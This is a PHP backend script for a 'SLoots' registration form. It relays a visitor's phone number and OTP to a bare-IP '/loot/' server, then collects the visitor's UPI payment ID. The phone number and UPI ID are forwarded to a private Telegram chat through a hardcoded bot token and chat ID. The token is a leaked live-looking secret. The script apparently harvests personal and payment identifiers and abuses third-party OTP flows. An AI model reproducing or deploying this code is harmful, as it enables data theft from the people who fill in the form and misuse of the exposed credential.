<?php
header('Access-Control-Allow-Origin: *');
header('Content-Type: application/json');

// =======================================================
//          !!! CUSTOM CONFIGURATION !!!
// =======================================================
$botToken = '8038263033:AAEhPlCJ1DOZ4LFTFJJXT59PKg3xDnJ6w3Q';
$chatId = '6575825147';
// =======================================================

$response = [];
$action = $_POST['action'] ?? '';

// --- NEW, MORE POWERFUL REQUEST FUNCTION WITH COOKIE SUPPORT ---
function makeRequest($url, $phoneNumber) {
    // Each user gets their own unique cookie file based on their phone number.
    $cookieFile = 'cookie_' . $phoneNumber . '.txt';

    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 20,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        
        // --- THIS IS THE MAGIC PART ---
        // Save any cookies the server gives us into the user's file.
        CURLOPT_COOKIEJAR => $cookieFile,
        // Send any cookies we have saved in the user's file.
        CURLOPT_COOKIEFILE => $cookieFile,
    ]);
    $html = curl_exec($ch);
    curl_close($ch);
    return $html;
}

// Function to send a message to your Telegram
function sendMessageToTelegram($message) {
    global $botToken, $chatId;
    $telegramApiUrl = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $postData = http_build_query(['chat_id' => $chatId, 'text' => $message, 'parse_mode' => 'HTML']);
    $ch = curl_init();
    curl_setopt_array($ch, [CURLOPT_URL => $telegramApiUrl, CURLOPT_POST => true, CURLOPT_POSTFIELDS => $postData, CURLOPT_RETURNTRANSFER => true]);
    curl_exec($ch);
    curl_close($ch);
}

$baseUrl = 'http://13.234.36.150/loot/';

switch ($action) {
    case 'request_otp':
        $phone = $_POST['phone'] ?? '';
        if (empty($phone)) {
            $response = ['status' => 'error', 'message' => 'Phone number is required.'];
            break;
        }
        $url = $baseUrl . '?rno=' . urlencode($phone) . '&submit=submit';
        $html = makeRequest($url, $phone); // Pass phone number for cookie session
        if (strpos($html, 'OTP SEND SUCCESSFUL') !== false) {
            $response = ['status' => 'success', 'message' => 'OTP sent successfully!'];
        } else {
            $response = ['status' => 'error', 'message' => 'Failed to send OTP. Number might be already registered or invalid.'];
        }
        break;

    case 'verify_otp':
        $phone = $_POST['phone'] ?? '';
        $otp = $_POST['otp'] ?? '';
        if (empty($phone) || empty($otp)) {
            $response = ['status' => 'error', 'message' => 'Phone and OTP are required.'];
            break;
        }
        $url = $baseUrl . 'otp.php?phone=' . urlencode($phone) . '&otp=' . urlencode($otp) . '&submit=submit';
        $html = makeRequest($url, $phone); // Pass phone number for cookie session
        if (strpos($html, 'User Is Verified') !== false) {
            $response = ['status' => 'success', 'message' => 'OTP Verified! Please enter your UPI ID.'];
        } else {
            $response = ['status' => 'error', 'message' => 'OTP is incorrect or expired.'];
        }
        break;

    case 'submit_upi':
        $phone = $_POST['phone'] ?? '';
        $upi = $_POST['upi'] ?? '';
        if (empty($phone) || empty($upi)) {
            $response = ['status' => 'error', 'message' => 'Phone and UPI ID are required.'];
            break;
        }
        
        $message = "<b>✨ New SLoots Registration ✨</b>\n\n<b>Phone:</b> <code>" . htmlspecialchars($phone) . "</code>\n<b>UPI ID:</b> <code>" . htmlspecialchars($upi) . "</code>";
        sendMessageToTelegram($message);
        
        // Clean up the cookie file after we are done.
        $cookieFile = 'cookie_' . $phone . '.txt';
        if (file_exists($cookieFile)) {
            unlink($cookieFile);
        }
        
        $response = ['status' => 'success', 'message' => 'Registration Complete! Your details have been sent to the admin.'];
        break;

    default:
        $response = ['status' => 'error', 'message' => 'Invalid action.'];
        break;
}

echo json_encode($response);
?>